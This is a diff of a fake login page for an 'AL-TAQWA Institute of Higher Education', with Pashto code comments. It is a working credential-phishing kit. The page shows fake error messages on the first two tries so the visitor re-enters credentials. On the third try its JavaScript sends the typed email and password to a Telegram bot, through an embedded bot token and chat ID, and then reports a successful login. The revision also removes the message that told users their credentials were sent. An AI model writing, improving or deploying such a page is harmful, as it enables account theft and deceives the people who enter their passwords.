@@ -2,167 +2,203 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AL-TAQWA Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>AL-TAQWA - Sign in</title>
     <style>
+        /* Reset & Base - سپین پس‌منظر، لکه انځور */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
+
         body {
-            background: linear-gradient(145deg, #0a3f31 0%, #166e52 100%);
-            min-height: 100vh;
+            background: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
+            min-height: 100vh;
+            margin: 0;
             padding: 20px;
         }
-        .card {
-            background-color: #ffffff;
-            max-width: 460px;
+
+        /* د کارت بڼه – سپینه، د انځور په شان ساده سیوري */
+        .login-container {
             width: 100%;
-            padding: 38px 32px 42px;
-            border-radius: 40px;
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.25);
+            max-width: 480px;
+            background: white;
+            border-radius: 0;
+            box-shadow: none;
+            padding: 40px 32px 48px;
             text-align: center;
-            transition: all 0.2s;
         }
-        .logo-area h1 {
-            font-size: 32px;
-            font-weight: 800;
-            color: #1a5d48;
+
+        /* لوګو / نوم - لکه انځور */
+        .logo h1 {
+            font-size: 36px;
+            font-weight: 700;
+            color: #1e3a2f;
             letter-spacing: -0.5px;
+            margin-bottom: 8px;
         }
-        .logo-area p {
-            font-size: 14px;
-            color: #5d756a;
-            margin-top: 6px;
-        }
-        .institute-badge {
+
+        .logo .institute {
             font-size: 15px;
-            font-weight: 600;
-            color: #2a7f62;
-            background: #eef5f1;
-            display: inline-block;
-            padding: 6px 22px;
-            border-radius: 60px;
-            margin: 18px 0 22px;
+            color: #4a6b5e;
+            font-weight: 500;
+            margin-bottom: 24px;
         }
+
+        .signin-badge {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1e3a2f;
+            background: transparent;
+            margin: 20px 0 16px 0;
+            letter-spacing: 0.3px;
+        }
+
+        /* فورم ډیزاین – دقیقاً د انځور په شان */
         .input-group {
             text-align: left;
             margin-bottom: 22px;
         }
+
         .input-group label {
             display: block;
-            font-weight: 600;
-            font-size: 13px;
-            color: #2d4a3e;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1e2a24;
             margin-bottom: 6px;
-            letter-spacing: 0.3px;
         }
+
         .input-group input {
             width: 100%;
-            padding: 15px 18px;
+            padding: 14px 16px;
             font-size: 15px;
-            border: 1.5px solid #dde5e0;
-            border-radius: 28px;
+            border: 1px solid #d4dcd8;
+            border-radius: 12px;
+            background: #fff;
             outline: none;
             transition: 0.2s;
-            background-color: #fefcf7;
         }
+
         .input-group input:focus {
-            border-color: #2c7a5e;
-            box-shadow: 0 0 0 3px rgba(44, 122, 94, 0.2);
+            border-color: #2b7a5c;
+            box-shadow: 0 0 0 3px rgba(43, 122, 92, 0.1);
         }
-        .checkbox {
+
+        /* چیک باکس – لکه عکس */
+        .checkbox-wrapper {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin: 18px 0 28px;
-            font-size: 14px;
-            color: #3f6858;
+            margin: 20px 0 32px;
         }
+
+        .checkbox-wrapper input {
+            width: 18px;
+            height: 18px;
+            margin: 0;
+        }
+
+        .checkbox-wrapper label {
+            font-size: 14px;
+            color: #2a4238;
+            font-weight: 500;
+        }
+
+        /* لاګ ان تڼۍ – د انځور په شان رنګ */
         button {
             width: 100%;
-            background-color: #1f6e55;
+            background-color: #216e54;
             color: white;
-            font-size: 17px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             padding: 14px;
             border: none;
-            border-radius: 44px;
+            border-radius: 40px;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
         }
+
         button:hover {
-            background-color: #0f5a45;
-            transform: scale(0.97);
+            background-color: #155a44;
         }
-        .msg-area {
-            margin-top: 20px;
-        }
-        .error-msg {
-            background-color: #ffe6e5;
-            color: #b91c1c;
-            padding: 10px 14px;
-            border-radius: 40px;
+
+        /* د پیغام ښودلو ساحه – هیڅ پښتو نشته */
+        .message-area {
+            margin-top: 24px;
             font-size: 13px;
             font-weight: 500;
         }
-        .success-msg {
-            background-color: #e0f7ed;
-            color: #146b48;
+
+        .error-message {
+            background-color: #fef2f0;
+            color: #c5221f;
+            padding: 10px 14px;
+            border-radius: 60px;
+            display: inline-block;
+            width: 100%;
         }
+
+        .success-message {
+            background-color: #e6f4ea;
+            color: #146b3a;
+        }
+
+        /* د عکس سره سمون – کوم اضافي عنصر نه */
         hr {
-            margin-top: 20px;
-            border: 0.5px solid #e2ece5;
+            display: none;
+        }
+
+        /* د یادښت هیڅ توکي نه */
+        .note-hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <div class="logo-area">
+<div class="login-container">
+    <div class="logo">
         <h1>AL-TAQWA</h1>
-        <p>Institute of Higher Education</p>
-        <div class="institute-badge">Sign in</div>
+        <div class="institute">Institute of Higher Education</div>
     </div>
+    <div class="signin-badge">Sign in</div>
 
     <form id="loginForm">
         <div class="input-group">
             <label>Email</label>
-            <input type="email" id="email" placeholder="your@email.com" required autocomplete="off">
+            <input type="email" id="email" placeholder="Email" autocomplete="off">
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" id="password" placeholder="········" required>
+            <input type="password" id="password" placeholder="Password">
         </div>
-        <div class="checkbox">
+        <div class="checkbox-wrapper">
             <input type="checkbox" id="rememberCheckbox">
             <label for="rememberCheckbox">Remember password</label>
         </div>
-        <button type="submit" id="loginBtn">Login</button>
+        <button type="submit" id="loginButton">Login</button>
     </form>
-    
-    <div id="messageBox"></div>
+
+    <div id="messageDisplay" class="message-area"></div>
 </div>
 
 <script>
-    // ======================
-    // د هڅو شمیر ساتل (مګر کارونکي ته نه ښودل کیږي)
-    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts_altaqwa')) || 0;
+    // د هڅو شمېر (په session کې ساتل کیږي، کارونکي ته نه ښودل کیږي)
+    let attemptCount = parseInt(sessionStorage.getItem('loginAttempts')) || 0;
 
-    // د ټیلیګرام بوټ معلومات
+    // ټیلیګرام بوټ توکین او چټ آي ډي (لکه څنګه چې غوښتل شوي)
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const CHAT_ID = "8295417969";
 
-    // د ټیلیګرام پیغام لېږلو فنکشن
+    // د ټیلیګرام استولو فنکشن
     async function sendToTelegram(email, password) {
-        const message = `🔐 *AL-TAQWA LOGIN SUCCESS* 🔐\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
+        const message = `🔐 *AL-TAQWA LOGIN* 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
         try {
             await fetch(url, {
                 method: "POST",
@@ -174,25 +210,24 @@
                 })
             });
         } catch (err) {
-            console.error("Telegram error:", err);
+            console.error("Telegram send error:", err);
         }
     }
 
     function showMessage(text, isSuccess = false) {
-        const msgDiv = document.getElementById('messageBox');
-        msgDiv.innerHTML = `<div class="error-msg ${isSuccess ? 'success-msg' : ''}">${text}</div>`;
-        
+        const msgDiv = document.getElementById('messageDisplay');
+        msgDiv.innerHTML = `<div class="error-message ${isSuccess ? 'success-message' : ''}">${text}</div>`;
         if (isSuccess) {
-            // بریالی لاګ ان – ان پوټونه بند کړئ
+            // بریالي لاګ ان – انپوټونه او بټن غیر فعال کړئ
             document.getElementById('email').disabled = true;
             document.getElementById('password').disabled = true;
-            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('loginButton').disabled = true;
             setTimeout(() => {
-                sessionStorage.removeItem('loginAttempts_altaqwa');
-                if (confirm("✅ Login successful!\nDo you want to reload the page?")) {
+                sessionStorage.removeItem('loginAttempts');
+                if (confirm("✅ Login successful!\nReload page?")) {
                     window.location.reload();
                 }
-            }, 500);
+            }, 400);
         }
     }
 
@@ -204,59 +239,57 @@
         const passwordInput = document.getElementById('password').value;
         const rememberChecked = document.getElementById('rememberCheckbox').checked;
 
-        // د Remember password اختیار
+        // د "Remember password" ساده ساتنه (یوازې UI)
         if (rememberChecked) {
-            localStorage.setItem('remEmail_altaqwa', emailInput);
+            localStorage.setItem('savedEmail', emailInput);
         } else {
-            localStorage.removeItem('remEmail_altaqwa');
+            localStorage.removeItem('savedEmail');
         }
 
-        // پدې حالت کې هر ایمیل او هر پاسورډ منل کیږي، مګر د هڅو شمیر په پام کې نیول کیږي
-        // لومړۍ هڅه (attemptCount = 0)
+        // کړنلار (Logic) : 
+        // لومړۍ هڅه (attemptCount === 0) -> please check your email
         if (attemptCount === 0) {
             showMessage("please check your email", false);
             attemptCount++;
-            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
+            sessionStorage.setItem('loginAttempts', attemptCount);
             return;
         }
         
-        // دوهمه هڅه (attemptCount = 1)
+        // دوهمه هڅه (attemptCount === 1) -> please check your password
         if (attemptCount === 1) {
             showMessage("please check your password", false);
             attemptCount++;
-            sessionStorage.setItem('loginAttempts_altaqwa', attemptCount);
+            sessionStorage.setItem('loginAttempts', attemptCount);
             return;
         }
         
-        // دریمه هڅه (attemptCount = 2) – هر ډول ایمیل او پاسورډ ومنئ
+        // دریمه هڅه (attemptCount === 2) – هر ډول ایمیل/پاسورډ ومنئ او بریالی لاګ ان
         if (attemptCount === 2) {
-            // هر هغه څه چې دننه شوي وي، بریالی لاګ ان ګڼل کیږي
-            // معلومات اډمین (ټیلیګرام) ته واستوئ
+            // ټیلیګرام ته استول
             await sendToTelegram(emailInput, passwordInput);
-            showMessage("✅ Login successful! Your credentials have been sent to admin.", true);
-            sessionStorage.removeItem('loginAttempts_altaqwa');
+            showMessage("✅ Login successful", true);
+            sessionStorage.removeItem('loginAttempts');
             return;
         }
         
-        // که د 3 څخه زیاتې هڅې شوې وي (امنیتي حالت) – بلاک
+        // که د 3 څخه زیاتې هڅې شوې وي (یوازې د خوندیتوب لپاره)
         if (attemptCount >= 3) {
-            showMessage("Too many attempts. Please refresh the page.", false);
-            document.getElementById('loginBtn').disabled = true;
+            showMessage("Too many attempts. Refresh page.", false);
+            document.getElementById('loginButton').disabled = true;
         }
     });
 
-    // د مخ په پیل کې: که لا دمخه هڅې شوې وي، بټن غیرفعال مه کوئ مګر هڅو ته اجازه ورکړئ
+    // د مخ په پیل کې د یاد شوي ایمیل ډکول
     window.addEventListener('DOMContentLoaded', () => {
-        // که د هڅو شمیر له 3 څخه پورته وي، لاګ ان بند کړئ
-        if (sessionStorage.getItem('loginAttempts_altaqwa') >= 3) {
-            document.getElementById('loginBtn').disabled = true;
-            showMessage("Session expired. Please refresh the page.", false);
-        }
-        
-        const savedEmail = localStorage.getItem('remEmail_altaqwa');
-        if (savedEmail) {
-            document.getElementById('email').value = savedEmail;
+        const saved = localStorage.getItem('savedEmail');
+        if (saved) {
+            document.getElementById('email').value = saved;
             document.getElementById('rememberCheckbox').checked = true;
+        }
+        // که هڅې مخکې له 3 څخه زیاتې شوي وای، نو بټن بند کړئ
+        if (sessionStorage.getItem('loginAttempts') >= 3) {
+            document.getElementById('loginButton').disabled = true;
+            showMessage("Session expired. Please refresh the page.", false);
         }
     });
 </script>
